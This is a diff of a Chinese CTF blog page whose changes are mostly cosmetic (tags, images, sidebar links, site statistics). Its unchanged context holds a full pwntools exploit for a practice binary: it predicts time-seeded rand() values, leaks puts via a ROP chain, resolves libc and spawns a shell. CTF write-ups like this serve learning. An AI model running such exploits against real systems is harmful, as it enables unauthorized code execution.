@@ -24,7 +24,7 @@
 <link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
-  <meta name="keywords" content="pie,got改写,随机数检查" />
+  <meta name="keywords" content="got改写,pie,随机数检查" />
 
 
 <link rel="canonical" href="http://example.com/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
@@ -118,11 +118,11 @@ yhuanhuan =  = 不在能知，乃在能行</title>
       <div id="imgs" class="pjax">
         <ul>
           <li class="item" data-background-image="https://s2.loli.net/2023/08/03/PavyAqzTMBH8QjR.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/KXvdO79oYyh2ZI5.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/3QaAkKnrb4hzo58.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/pxCY3PlNUAW5GTn.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/1worZdUHTMtXeP3.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/ibKkDqfNwIytXUL.png"></li>
           <li class="item" data-background-image="https://s2.loli.net/2023/08/03/8XHxYgIEC6JWoSP.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/6zF8ewj7Zn4pJIg.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/PeCrlT1WzSygfaB.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/Me2Cmi6yuWvhqKF.png"></li>
         </ul>
       </div>
     </header>
@@ -231,8 +231,8 @@ yhuanhuan =  = 不在能知，乃在能行</title>
 <figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span></pre></td></tr><tr><td data-num="7"></td><td><pre>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>local <span class="token operator">=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>ret <span class="token operator">=</span> <span class="token number">0x40101a</span></pre></td></tr><tr><td data-num="19"></td><td><pre>pop_rdi <span class="token operator">=</span> <span class="token number">0x401443</span></pre></td></tr><tr><td data-num="20"></td><td><pre>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="22"></td><td><pre>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="23"></td><td><pre>gift <span class="token operator">=</span> <span class="token number">0x40125D</span></pre></td></tr><tr><td data-num="24"></td><td><pre>b <span class="token operator">=</span> libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token operator">+</span> p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name:\n'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    v6 <span class="token operator">=</span> libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'number:\n'</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'your gift!\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>payload1 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>gift<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>addr_system <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>addr_binsh <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr_binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr_system<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>os: 早知道 libcsearcher 能打通，谁会掉头发！！！！</p>
 
       <div class="tags">
-          <a href="/tags/pie/" rel="tag"><i class="ic i-tag"></i> pie</a>
           <a href="/tags/got%E6%94%B9%E5%86%99/" rel="tag"><i class="ic i-tag"></i> got改写</a>
+          <a href="/tags/pie/" rel="tag"><i class="ic i-tag"></i> pie</a>
           <a href="/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%A3%80%E6%9F%A5/" rel="tag"><i class="ic i-tag"></i> 随机数检查</a>
       </div>
   </div>
@@ -285,7 +285,7 @@ yhuanhuan =  = 不在能知，乃在能行</title>
     <div class="item left">
       
 
-  <a href="/2023/08/02/find-flag/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;pxCY3PlNUAW5GTn.png" title="find_flag">
+  <a href="/2023/08/02/find-flag/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;04&#x2F;ibKkDqfNwIytXUL.png" title="find_flag">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> 复现</span>
   <h3>find_flag</h3>
@@ -295,7 +295,7 @@ yhuanhuan =  = 不在能知，乃在能行</title>
     <div class="item right">
       
 
-  <a href="/2023/08/03/csu/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;tNd3AzOayGcXsCk.png" title="csu">
+  <a href="/2023/08/03/csu/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;8XHxYgIEC6JWoSP.png" title="csu">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> 技巧</span>
   <h3>csu</h3>
@@ -335,7 +335,7 @@ yhuanhuan =  = 不在能知，乃在能行</title>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">14</span>
+        <span class="count">15</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -426,12 +426,12 @@ yhuanhuan =  = 不在能知，乃在能行</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 web的学习">web的学习</a>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
 <i class="ic i-angle-right"></i>
-<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/wp/" title="分类于 wp">wp</a>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
 </div>
 
-    <span><a href="/2023/08/24/web-new/" title="web_new">web_new</a></span>
+    <span><a href="/2023/09/22/new-pwn/" title="new_pwn">new_pwn</a></span>
   </li>
 
       
@@ -444,6 +444,18 @@ yhuanhuan =  = 不在能知，乃在能行</title>
 </div>
 
     <span><a href="/2023/08/09/bins/" title="bins">bins</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/srop/" title="srop">srop</a></span>
   </li>
 
       
@@ -465,7 +477,7 @@ yhuanhuan =  = 不在能知，乃在能行</title>
 <a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
 </div>
 
-    <span><a href="/2023/08/03/csu/" title="csu">csu</a></span>
+    <span><a href="/2023/08/04/b-canary/" title="b_canary">b_canary</a></span>
   </li>
 
       
@@ -477,19 +489,28 @@ yhuanhuan =  = 不在能知，乃在能行</title>
 <a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
 </div>
 
-    <span><a href="/2023/09/22/new-pwn/" title="new_pwn">new_pwn</a></span>
+    <span><a href="/2023/09/22/picture/new-pwn/" title="new_pwn">new_pwn</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
 </div>
 
-    <span><a href="/2023/08/03/srop/" title="srop">srop</a></span>
+    <span><a href="/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/" title="技能兴鲁">技能兴鲁</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 web的学习">web的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/wp/" title="分类于 wp">wp</a>
+</div>
+
+    <span><a href="/2023/08/24/web-new/" title="web_new">web_new</a></span>
   </li>
 
       
@@ -514,28 +535,6 @@ yhuanhuan =  = 不在能知，乃在能行</title>
     <span><a href="/2023/08/02/find-flag/" title="find_flag">find_flag</a></span>
   </li>
 
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
-</div>
-
-    <span><a href="/2023/09/10/sictf-wp/" title="sictf_wp">sictf_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
-</div>
-
-    <span><a href="/2023/08/11/unlink/" title="unlink">unlink</a></span>
-  </li>
-
   </ul>
 </div>
 <div>
@@ -558,13 +557,13 @@ yhuanhuan =  = 不在能知，乃在能行</title>
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">102k 字</span>
+    <span title="站点总字数">120k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:33</span>
+    <span title="站点阅读时长">1:49</span>
   </div>
   <div class="powered-by">
     基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
